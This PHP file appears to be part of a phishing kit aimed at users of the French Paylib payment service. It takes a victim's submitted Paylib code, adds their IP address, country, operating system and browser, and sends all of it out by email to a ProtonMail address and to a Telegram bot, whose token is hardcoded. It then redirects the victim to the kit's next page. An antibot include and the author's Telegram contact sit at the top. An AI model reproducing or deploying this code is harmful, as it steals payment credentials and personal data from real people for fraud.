<?php
/*
Author : Oussama Mohammed ( ダンツ キング )
Telegram : https://t.me/MrGhostExpress

*/
session_start();
include_once 'functions.php';
include('./antibot-private.php');



		
$message = '/--------------- PAYLIB ID ---------------/' . "\r\n";
$message .= 'Code Paylib : ' . $_POST['reference'] . "\r\n";
$message .= '/--------------------------------------------------/' . "\r\n";
$message .= 'IPA : ' . get_user_ip() . "\r\n";
$message .= 'Pays : ' . get_user_country() . "\r\n";
$message .= 'Systeme : ' . get_user_os() . "\r\n";
$message .= 'Navigateur : ' . get_user_browser() . "\r\n";
$message .= 'Agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$message .= '/--------------- END PAYLIB INFO ---------------/' . "\r\n\r\n";

$send = "pardongo@protonmail.com";
$subject = "Paylib ID : ".$_POST['reference']."  [ " . get_user_country() . " - " . get_user_os() . " - " . get_user_ip() . " ]";
$headers = "From: ダンツ キング<log@mrghoost.fr>";
mail($send,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot5206138912:AAG4k-4E7r0gZcqd9VcLd75-kz7vlYV_WiI/sendMessage?chat_id=2073417851&text=" . urlencode($message)."" );

     echo header('location: ./info.php?forceReload=' . md5(time()) . '' . md5(time()) . '' . md5(time()) . '&p=1&dispatch=' . sha1(time()));

?>